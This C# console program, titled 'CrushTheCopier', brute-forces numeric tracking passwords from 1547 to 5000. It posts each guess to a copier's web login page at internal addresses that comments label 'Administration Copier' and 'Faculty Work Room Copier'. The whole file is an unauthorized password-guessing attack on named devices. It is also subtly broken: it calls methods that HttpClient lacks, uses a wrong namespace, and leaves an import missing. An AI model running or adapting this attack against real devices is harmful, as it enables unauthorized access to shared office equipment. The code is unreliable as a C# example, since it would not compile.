using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Http;
using System.Collections.Specialized;


namespace CrushTheCopier
{
    class Program
    {
        static void Main(string[] args)
        {
            int un = 1547;
            while (un < 5001)
            {
                Console.WriteLine(un);

                try
                {

                    // Download the data to a buffer.
                    // WebClient client = new System.Net.WebClient();
                    HttpClient client = new System.Net.HttpClient();

                    //Byte[] pageData = client.DownloadData("http://www.contoso.com");
                    //string pageHtml = Encoding.ASCII.GetString(pageData);
                    //Console.WriteLine(pageHtml);

                    // Download the data to a file.
                    // client.DownloadFile("http://www.contoso.com", "page.htm");

                    // Upload some form post values.
                    System.Collections.Specialized.NameValueCollection form = new NameValueCollection();
                    form.Add("func", "PSL_LP0_TOP");
                    form.Add("AuthType", "None");
                    form.Add("TrackType", "Password");
                    form.Add("ExtSvType", "");
                    form.Add("PswcForm", "HtmlFlash");
                    form.Add("Lang", "En");
                    form.Add("Mode", "Track");
                    form.Add("trackpassword", un.ToString());
                    form.Add("ViewMode", "Html");
                    form.Add("BrowseMode", "Low");
                    // Byte[] responseData = client.UploadValues("http://www.contoso.com/form.aspx", form);
                    // Faculty Work Room Copier
                    //Byte[] responseData = client.UploadValues("http://10.20.87.209/wcd/ulogin.cgi", form);
                    // Administration Copier
                    Byte[] responseData = client.UploadValues("http://10.20.87.239/wcd/ulogin.cgi", form);

                    Console.WriteLine(responseData.ToString());

                    un++;

                }   // try

                catch (WebException webEx)
                {
                    Console.WriteLine(webEx.ToString());
                    if (webEx.Status == WebExceptionStatus.ConnectFailure)
                    {
                        Console.WriteLine("Are you behind a firewall?  If so, go through the proxy server.");
                    }
                }
                Thread.Sleep(500);
            } // while
            Console.ReadLine("any key to exit");
       }

    }
}